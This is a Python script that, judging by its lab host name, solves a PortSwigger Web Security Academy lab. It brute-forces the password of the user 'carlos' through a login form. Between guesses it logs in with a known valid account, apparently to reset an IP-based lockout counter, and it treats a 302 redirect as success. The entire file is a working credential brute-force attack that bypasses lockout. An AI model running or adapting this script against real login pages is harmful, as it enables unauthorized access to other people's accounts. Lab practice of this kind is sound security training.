import requests
from pwn import *

class Exploit:

    def __init__(self):

        self.url = "https://0a3e0006032338df82f8bf2d004f0098.web-security-academy.net/login"
        self.headers = {"Content-Type":"application/x-www-form-urlencoded"}
        self.creds = ("wiener", "peter")
        self.proxy = {"https":"http://127.0.0.1:8080"}
        self.p1 = log.progress("Creds")
        self.p2 = log.progress("Status")

    def brute(self):

        counter = 0
        control = False

        with open("user.lst", "r") as f:
            for password in f:
                if counter < 1:
                    username = "carlos"
                    payload = f"username={username}&password={password.strip()}"
                    control = False
                    counter+=1
                else:
                    payload = f"username={self.creds[0]}&password={self.creds[1]}"
                    control = True
                    counter = 0

                self.p1.status(payload)
                r = requests.post(self.url, headers=self.headers, proxies=self.proxy, data=payload, verify=False, allow_redirects=False)
                self.p2.status(f"{r.status_code} - {control}")

                if r.status_code == 302 and control == False:
                    self.p2.success(payload)
                    break


def main():
    exploit = Exploit()
    exploit.brute()

if __name__ == "__main__":
    main() 
                        
